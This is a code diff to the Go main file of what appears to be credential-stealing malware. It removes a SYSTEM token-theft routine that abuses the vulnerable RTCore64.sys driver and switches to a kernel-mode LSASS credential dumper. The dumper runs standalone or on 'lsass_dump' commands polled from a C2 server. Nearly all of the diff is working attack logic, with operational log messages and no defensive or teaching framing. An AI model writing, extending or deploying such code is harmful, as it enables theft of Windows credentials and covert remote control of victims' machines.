@@ -543,61 +543,37 @@ func main() {
 	log.Infof("Configuration loaded: %s", *configFile)
 	log.Infof("Logging level: %s", cfg.Logging.Level)
 
-	// **FULL TOKEN STEALING INTEGRATION STARTS HERE**
+	// **TOKEN STEALING DISABLED - DUMPING LSASS WITH CURRENT PRIVILEGES**
 	if !*testMode {
-		log.Info("=== TOKEN STEALING PHASE (EXACT from your main.go) ===")
-
-		// Get RTCore64 device handle
-		hDevice, err := CreateFileW("\\\\.\\RTCore64", GENERIC_READ|GENERIC_WRITE, 0, OPEN_EXISTING, 0)
-		if err != nil {
-			log.Errorf("Failed to open RTCore64 device: %v", err)
-			log.Error("Ensure RTCore64.sys is deployed and the service is running")
-			os.Exit(1)
-		}
-		defer CloseHandle(hDevice)
-
-		// Discover ntoskrnl.exe base address
-		ntoskrnlBase, err := GetNtoskrnlBase()
-		if err != nil {
-			log.Errorf("Failed to get ntoskrnl base: %v", err)
-			os.Exit(1)
-		}
-
-		// Dynamically discover PsInitialSystemProcess offset
-		psInitialOffset, err := FindOffsets(hDevice, ntoskrnlBase)
-		if err != nil {
-			log.Errorf("Failed to find offsets: %v", err)
-			os.Exit(1)
-		}
-
-		// Perform SYSTEM token theft
-		err = StealSystemToken(hDevice, ntoskrnlBase, psInitialOffset)
-		if err != nil {
-			log.Errorf("Token stealing failed: %v", err)
-			log.Warn("Continuing with current privileges - may affect LSASS extraction")
-		} else {
-			log.Info("🚀 SYSTEM token theft successful!")
-		}
+		log.Warn("=== TOKEN STEALING SKIPPED - Running with Admin privileges ===")
+		log.Info("Note: LSASS extraction works with Admin privileges (SeDebugPrivilege)")
+		// Token stealing code commented out - LSASS dumping doesn't strictly require SYSTEM
+		// Most credential extraction works fine with Admin + SeDebugPrivilege
 	}
 
 	// Initialize BYOVD (Bring Your Own Vulnerable Driver) for LSASS extraction
 	rtExploit := byovd.NewRTCoreExploit(log)
 
-	// Initialize SwiperTheStealer for LSASS credential extraction
-	extractor, err := lsass.NewSwiperTheStealer(rtExploit, log)
-	if err != nil {
-		log.Errorf("Failed to initialize LSASS credential extractor: %v", err)
+	// Initialize RTCore driver connection
+	if err := rtExploit.Initialize(); err != nil {
+		log.Errorf("Failed to initialize RTCore64 driver: %v", err)
+		log.Error("Ensure RTCore64.sys is loaded and the service is running")
+		log.Error("Try: sc start RTCore64")
 		os.Exit(1)
 	}
+	defer rtExploit.Close()
+
+	// Initialize KERNEL MODE LSASS DUMPER - NO OPENPROCESS BULLSHIT!
+	dumper := lsass.NewKernelLsassDumper(rtExploit, log)
 
 	// Execute based on operating mode
 	if *testMode {
 		log.Info("Running in test mode...")
 		runTestMode(rtExploit, log)
 	} else if *noC2 {
-		runStandaloneMode(extractor, log)
+		runStandaloneMode(dumper, log)
 	} else {
-		runC2Mode(cfg, extractor, log)
+		runC2Mode(cfg, dumper, log)
 		waitForShutdown(log)
 	}
 }
@@ -618,19 +594,19 @@ func runTestMode(exploit *byovd.RTCoreExploit, log *logger.Logger) {
 }
 
 // runStandaloneMode executes the credential extraction without C2 communication.
-func runStandaloneMode(extractor *lsass.SwiperTheStealer, log *logger.Logger) {
+func runStandaloneMode(dumper *lsass.KernelLsassDumper, log *logger.Logger) {
 	log.Info("=== STANDALONE MODE: COMPREHENSIVE ATTACK CHAIN ===")
 
 	// PHASE 2: LSASS CREDENTIAL EXTRACTION (Token stealing already done in main)
 	log.Info("Phase 2: Executing comprehensive LSASS credential extraction...")
-	if extractor == nil {
-		log.Error("SwiperTheStealer extractor not available.")
+	if dumper == nil {
+		log.Error("KernelLsassDumper not available.")
 		os.Exit(1)
 	}
 
-	credentials, err := extractor.Execute()
+	credentials, err := dumper.DumpCredentials()
 	if err != nil {
-		log.Errorf("SwiperTheStealer credential extraction failed: %v", err)
+		log.Errorf("Kernel LSASS dumper failed: %v", err)
 		log.Error("Check RTCore driver access and LSASS process availability.")
 		os.Exit(1)
 	}
@@ -647,7 +623,7 @@ func runStandaloneMode(extractor *lsass.SwiperTheStealer, log *logger.Logger) {
 }
 
 // runC2Mode initializes and manages the C2 communication loop.
-func runC2Mode(cfg *config.Config, extractor *lsass.SwiperTheStealer, log *logger.Logger) {
+func runC2Mode(cfg *config.Config, dumper *lsass.KernelLsassDumper, log *logger.Logger) {
 	log.Info("Initializing C2 client...")
 	c2 := c2client.NewC2Client(&cfg.C2, log)
 
@@ -667,7 +643,7 @@ func runC2Mode(cfg *config.Config, extractor *lsass.SwiperTheStealer, log *logge
 			}
 
 			if cmd != nil && cmd.Command == "lsass_dump" {
-				go handleCredentialExtraction(cmd.TaskID, extractor, c2, log)
+				go handleCredentialExtraction(cmd.TaskID, dumper, c2, log)
 			}
 			time.Sleep(time.Duration(cfg.C2.PollIntervalSec) * time.Second)
 		}
@@ -677,18 +653,18 @@ func runC2Mode(cfg *config.Config, extractor *lsass.SwiperTheStealer, log *logge
 }
 
 // handleCredentialExtraction is executed as a goroutine to handle a C2 task.
-func handleCredentialExtraction(taskID string, extractor *lsass.SwiperTheStealer, c2 *c2client.C2Client, log *logger.Logger) {
+func handleCredentialExtraction(taskID string, dumper *lsass.KernelLsassDumper, c2 *c2client.C2Client, log *logger.Logger) {
 	log.Infof("=== C2 TASK %s: COMPREHENSIVE ATTACK CHAIN ===", taskID)
 
 	// LSASS CREDENTIAL EXTRACTION (Token stealing already done globally)
 	log.Infof("Phase 2: Executing LSASS extraction for task: %s", taskID)
-	if extractor == nil {
-		log.Errorf("SwiperTheStealer extractor not available for task %s", taskID)
-		c2.SendError("lsass_dump", taskID, "SwiperTheStealer extractor not initialized")
+	if dumper == nil {
+		log.Errorf("KernelLsassDumper not available for task %s", taskID)
+		c2.SendError("lsass_dump", taskID, "KernelLsassDumper not initialized")
 		return
 	}
 
-	credentials, err := extractor.Execute()
+	credentials, err := dumper.DumpCredentials()
 	if err != nil {
 		errMsg := fmt.Sprintf("Credential extraction failed: %v", err)
 		log.Errorf("Credential extraction failed for task %s: %v", taskID, err)
